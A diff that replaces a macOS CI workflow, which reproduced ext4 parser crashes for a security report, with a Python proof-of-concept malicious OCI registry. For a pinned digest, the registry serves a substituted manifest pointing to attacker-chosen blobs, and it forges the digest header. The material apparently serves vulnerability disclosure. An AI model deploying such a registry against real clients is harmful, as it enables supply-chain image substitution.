@@ -1,149 +1,196 @@
-name: ext4-crash-poc
-# marker: v2-no-workdir -- if you see this comment after pasting, you have the right file
+#!/usr/bin/env python3
+"""
+mock_registry.py -- a minimal malicious/compromised OCI registry.
 
-# Manual trigger: go to the Actions tab in your repo, select this workflow,
-# click "Run workflow". Also runs automatically on push, for convenience.
-#
-# This runs the actual crash reproduction on a real, Apple-hosted macOS
-# runner (GitHub's macos-26 image, Xcode 26.6 as of 2026-07-21) -- this is
-# the piece that cannot be done without physical/cloud Apple hardware, and
-# it's the specific thing Apple Product Security asked to see for
-# OE1107563755116: "a working proof of concept that demonstrates the crash
-# on a current macOS build".
-#
-# Each PoC image is EXPECTED to crash its run -- that's the bug being
-# demonstrated. The job is deliberately structured so one crashing step
-# doesn't stop the rest from running, and the full output (including the
-# actual Swift "Fatal error" trap text) ends up in both the workflow log
-# and the job summary.
+Demonstrates OE1107240405872: manifest content is never verified against
+its requested digest. This server:
 
-on:
-  workflow_dispatch:
-  push:
-    branches: [main]
+  1. Computes the SHA256 of a LEGITIMATE-looking manifest
+     (EXPECTED_MANIFEST_BYTES) -- this is the digest a caller would pin,
+     e.g. `container pull registry/name@sha256:<this>`.
+  2. On every request for that exact digest (both the HEAD used by
+     RegistryClient.resolve() and the GET used by RegistryClient.fetch()),
+     returns a COMPLETELY DIFFERENT manifest body (SUBSTITUTED_MANIFEST_BYTES)
+     referencing attacker-chosen layer/config blobs instead.
+  3. Serves those attacker blobs correctly (self-consistent, correctly
+     hashing) at /v2/{name}/blobs/{digest} -- blob-level verification is
+     enforced by the real client, so the substituted blobs must be
+     legitimate content at their own claimed digests. The vulnerability is
+     entirely about which manifest gets accepted, not about breaking blob
+     hashing.
 
-jobs:
-  reproduce:
-    runs-on: macos-26
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+Run: python3 mock_registry.py <port>
+Prints EXPECTED_DIGEST (the value to pin/request) to stdout on startup.
+"""
+import hashlib
+import http.server
+import json
+import sys
+import threading
 
-      - name: Show environment
-        run: |
-          sw_vers
-          xcodebuild -version
-          swift --version
 
-      - name: Build harness
-        run: swift build
+def sha256_hex(data: bytes) -> str:
+    return hashlib.sha256(data).hexdigest()
 
-      - name: Run all PoC images
-        run: |
-          LOG="poc-results.log"
-          : > "$LOG"
 
-          {
-            echo "## ext4-crash-poc results"
-            echo
-            echo '```'
-          } | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
+def digest_of(data: bytes) -> str:
+    return "sha256:" + sha256_hex(data)
 
-          BIN=".build/debug/ext4-crash-poc"
-          images=(
-            "poc.img:Bug 1 - getExtents entries overflow (file inode, depth=0)"
-            "poc_root_construction.img:Bug 1 - getExtents entries overflow (root inode, crashes on open)"
-            "poc_depth1.img:Bug 1b - getExtents depth==1 index-node branch"
-            "poc_dirbug_recordlength.img:Bug 2a - getDirEntries record-length gap"
-            "poc_dirbug_namelength.img:Bug 2b - getDirEntries nameLength gap"
-          )
 
-          for entry in "${images[@]}"; do
-            img="${entry%%:*}"
-            desc="${entry#*:}"
+# ---------------------------------------------------------------------------
+# The manifest a caller believes they are pinning by digest.
+# (Its bytes are never actually served by this malicious registry -- that's
+# the point. Its digest is what gets requested; a legitimate registry would
+# serve exactly these bytes back for that digest.)
+# ---------------------------------------------------------------------------
+EXPECTED_MANIFEST_BYTES = json.dumps(
+    {
+        "schemaVersion": 2,
+        "mediaType": "application/vnd.oci.image.manifest.v1+json",
+        "config": {
+            "mediaType": "application/vnd.oci.image.config.v1+json",
+            "digest": "sha256:" + "0" * 64,  # placeholder -- never actually fetched
+            "size": 2,
+        },
+        "layers": [
             {
-              echo
-              echo "--- $img ($desc) ---"
-            } | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
+                "mediaType": "application/vnd.oci.image.layer.v1.tar",
+                "digest": "sha256:" + "1" * 64,  # placeholder -- never actually fetched
+                "size": 2,
+            }
+        ],
+    },
+    separators=(",", ":"),
+).encode("utf-8")
+EXPECTED_DIGEST = digest_of(EXPECTED_MANIFEST_BYTES)
 
-            set +e
-            output=$("$BIN" "$img" 2>&1)
-            status=$?
-            set -e
+# ---------------------------------------------------------------------------
+# What the malicious registry actually returns for a request addressed by
+# EXPECTED_DIGEST. References attacker-chosen blobs below.
+# ---------------------------------------------------------------------------
+ATTACKER_LAYER_BYTES = b"ATTACKER-CONTROLLED LAYER CONTENT -- substituted via manifest, not blob"
+ATTACKER_LAYER_DIGEST = digest_of(ATTACKER_LAYER_BYTES)
 
-            echo "$output" | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
+ATTACKER_CONFIG_BYTES = json.dumps(
+    {
+        "architecture": "arm64",
+        "os": "linux",
+        "rootfs": {"type": "layers", "diff_ids": [ATTACKER_LAYER_DIGEST]},
+        "attacker": "this is not the image you pinned",
+    },
+    separators=(",", ":"),
+).encode("utf-8")
+ATTACKER_CONFIG_DIGEST = digest_of(ATTACKER_CONFIG_BYTES)
 
-            if [ $status -eq 0 ]; then
-              echo "RESULT: FAIL (exited cleanly -- did not crash)" | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
-            else
-              echo "RESULT: PASS (crashed as expected, exit status $status)" | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
-            fi
-          done
-
-          echo '```' >> "$GITHUB_STEP_SUMMARY"
-          # Exit 0 regardless of individual crashes -- "the images crashed"
-          # is a PASS for our purposes, not a CI failure. Per-image results
-          # are visible above and in poc-results.log.
-          exit 0
-
-      - name: Upload full log as artifact
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: ext4-crash-poc-macos-log
-          path: poc-results.log
-
-      - name: Capture symbolicated backtraces (lldb)
-        if: always()
-        run: |
-          LOG="poc-backtraces.log"
-          : > "$LOG"
-
-          {
-            echo "## ext4-crash-poc backtraces (lldb)"
-            echo
-            echo "Each image is run under lldb. A REAL crash shows a stopped"
-            echo "thread with a backtrace naming the crashing function (e.g."
-            echo "EXT4.EXT4Reader.getExtents, Data.subdata, etc). If an image"
-            echo "did not crash, lldb will report the process exited instead."
-            echo
-            echo '```'
-          } | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
-
-          BIN=".build/debug/ext4-crash-poc"
-          images=(
-            "poc.img:Bug 1 - getExtents entries overflow (file inode, depth=0)"
-            "poc_root_construction.img:Bug 1 - getExtents entries overflow (root inode, crashes on open)"
-            "poc_depth1.img:Bug 1b - getExtents depth==1 index-node branch"
-            "poc_dirbug_recordlength.img:Bug 2a - getDirEntries record-length gap"
-            "poc_dirbug_namelength.img:Bug 2b - getDirEntries nameLength gap"
-          )
-
-          for entry in "${images[@]}"; do
-            img="${entry%%:*}"
-            desc="${entry#*:}"
+SUBSTITUTED_MANIFEST_BYTES = json.dumps(
+    {
+        "schemaVersion": 2,
+        "mediaType": "application/vnd.oci.image.manifest.v1+json",
+        "config": {
+            "mediaType": "application/vnd.oci.image.config.v1+json",
+            "digest": ATTACKER_CONFIG_DIGEST,
+            "size": len(ATTACKER_CONFIG_BYTES),
+        },
+        "layers": [
             {
-              echo
-              echo "--- $img ($desc) ---"
-            } | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
+                "mediaType": "application/vnd.oci.image.layer.v1.tar",
+                "digest": ATTACKER_LAYER_DIGEST,
+                "size": len(ATTACKER_LAYER_BYTES),
+            }
+        ],
+    },
+    separators=(",", ":"),
+).encode("utf-8")
+SUBSTITUTED_DIGEST = digest_of(SUBSTITUTED_MANIFEST_BYTES)
 
-            set +e
-            lldb_out=$(lldb -b \
-              -o "run" \
-              -o "bt all" \
-              -o "quit" \
-              -- "$BIN" "$img" 2>&1)
-            set -e
+BLOBS = {
+    ATTACKER_CONFIG_DIGEST: ATTACKER_CONFIG_BYTES,
+    ATTACKER_LAYER_DIGEST: ATTACKER_LAYER_BYTES,
+}
 
-            echo "$lldb_out" | tee -a "$LOG" "$GITHUB_STEP_SUMMARY"
-          done
+MEDIA_TYPE = "application/vnd.oci.image.manifest.v1+json"
 
-          echo '```' >> "$GITHUB_STEP_SUMMARY"
-          exit 0
 
-      - name: Upload backtrace log as artifact
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: ext4-crash-poc-backtraces
-          path: poc-backtraces.log
+class Handler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, fmt, *args):
+        sys.stderr.write("[mock_registry] " + (fmt % args) + "\n")
+
+    def _manifest_ref(self, path_parts):
+        # /v2/{name...}/manifests/{ref}
+        idx = path_parts.index("manifests")
+        name = "/".join(path_parts[1:idx])
+        ref = path_parts[idx + 1]
+        return name, ref
+
+    def _blob_digest(self, path_parts):
+        idx = path_parts.index("blobs")
+        digest = path_parts[idx + 1]
+        return digest
+
+    def do_HEAD(self):
+        parts = self.path.strip("/").split("/")
+        if "manifests" in parts:
+            name, ref = self._manifest_ref(parts)
+            # Serve the SUBSTITUTED manifest's metadata regardless of what
+            # was requested -- but report Docker-Content-Digest as the
+            # EXPECTED (requested) digest when that's what was asked for, so
+            # resolve() looks entirely self-consistent with the request. The
+            # actual GET below is what silently returns different bytes.
+            self.send_response(200)
+            self.send_header("Docker-Content-Digest", ref if ref.startswith("sha256:") else EXPECTED_DIGEST)
+            self.send_header("Content-Type", MEDIA_TYPE)
+            self.send_header("Content-Length", str(len(SUBSTITUTED_MANIFEST_BYTES)))
+            self.end_headers()
+            return
+        self.send_response(404)
+        self.end_headers()
+
+    def do_GET(self):
+        parts = self.path.strip("/").split("/")
+        if parts[0] == "v2" and len(parts) == 2 and parts[1] == "":
+            self.send_response(200)
+            self.end_headers()
+            return
+        if "manifests" in parts:
+            name, ref = self._manifest_ref(parts)
+            sys.stderr.write(f"[mock_registry] GET manifest ref={ref} -> serving SUBSTITUTED body "
+                              f"(actual digest {SUBSTITUTED_DIGEST}), regardless of requested digest\n")
+            body = SUBSTITUTED_MANIFEST_BYTES
+            self.send_response(200)
+            self.send_header("Content-Type", MEDIA_TYPE)
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        if "blobs" in parts:
+            digest = self._blob_digest(parts)
+            body = BLOBS.get(digest)
+            if body is None:
+                self.send_response(404)
+                self.end_headers()
+                return
+            self.send_response(200)
+            self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        self.send_response(404)
+        self.end_headers()
+
+
+def main():
+    port = int(sys.argv[1]) if len(sys.argv) > 1 else 0
+    server = http.server.HTTPServer(("127.0.0.1", port), Handler)
+    actual_port = server.server_address[1]
+    print(f"MOCK_REGISTRY_PORT={actual_port}")
+    print(f"EXPECTED_DIGEST={EXPECTED_DIGEST}")
+    print(f"SUBSTITUTED_DIGEST={SUBSTITUTED_DIGEST}")
+    print(f"ATTACKER_CONFIG_DIGEST={ATTACKER_CONFIG_DIGEST}")
+    print(f"ATTACKER_LAYER_DIGEST={ATTACKER_LAYER_DIGEST}")
+    sys.stdout.flush()
+    server.serve_forever()
+
+
+if __name__ == "__main__":
+    main()
